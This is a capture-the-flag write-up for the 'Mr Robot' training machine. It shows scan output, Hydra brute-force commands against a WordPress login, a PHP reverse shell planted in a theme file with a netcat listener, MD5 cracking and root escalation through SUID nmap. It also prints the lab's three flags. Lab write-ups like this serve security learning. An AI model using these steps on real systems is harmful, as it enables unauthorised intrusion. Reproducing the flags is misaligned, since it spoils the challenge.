# Mr Robot

- **NMAP scan**

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 cc:ba:aa:ae:a7:8d:86:ea:3a:69:56:85:76:96:59:25 (RSA)
|   256 6c:b7:e7:22:9b:3d:1b:ab:10:8e:26:08:60:50:20:78 (ECDSA)
|_  256 83:4c:c5:07:ef:f6:a4:14:71:df:84:cd:e9:6b:38:6e (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
|_SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
```

- **gobuster scan**

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1188]
/intro                (Status: 200) [Size: 516314]
/license              (Status: 200) [Size: 309]
/license.txt          (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.80.160.110/wp-login.php]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/readme.html          (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
```

- On `robots.txt` I found:

```
fsocity.dic
key-1-of-3.txt
```

- The first file is a dictionary of words (that I can use later). While on the second one, there's key 1 (**073403c8a58a1f80d943455fb30724b9**). 

- By examining gobuster's results, I found out `/wp-login.php/`! Now I can try to bruteforce the username and password using **Hydra** in this way: 

```bash
hydra -L fsocity.dic -p fakepasswd <SERVER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 20

hydra -l Elliot -P fsocity.dic <SERVER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 20
```

- Finally, the username will be **Elliot** and password will be **ER28-0652**

- Now I can put a reverse shell on `/archive.php` by pasting a `.php` script (the same as the one used in **RootMe challenge**).

- I open a listening socket with `nc -lnvp 4444` and visit `/wp-content/themes/twentyfifteen/archive.php` endpoint and open the previously uploaded file.

- On the reverse shell, I can see a `/home/robot` folder inside which there are:

```bash
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

- I cannot read `key-2-of-3.txt` but I can read `password.raw-md5`, which gives me:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

- By putting **c3fcd3d76192e4007dfb496cca67e13b** on https://crackstation.net/ I can succesfully decrypt the MD5 password for robot user, which is: **abcdefghijklmnopqrstuvwxyz**  

- Now I can login as robot (with `su robot`) and can read key 2 inside `key-2-of-3.txt`: **822c73956184f694993bede3eb39f959**

- Finally, I have to escalate privileges becoming root user. To do this, I can exploit SUID binaries that I'm allowed to use as robot user. To know what are these binaries, I can run:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- I noticed `/usr/local/bin/nmap`. So I have to look for privilege escalation scripts on https://gtfobins.org/ :

```bash
nmap --interactive
!/bin/sh
```

- Eventually, I'm root user and I can access root folder and read the final key 3: **04787ddef27c3dee1ee161b21670b4e4**


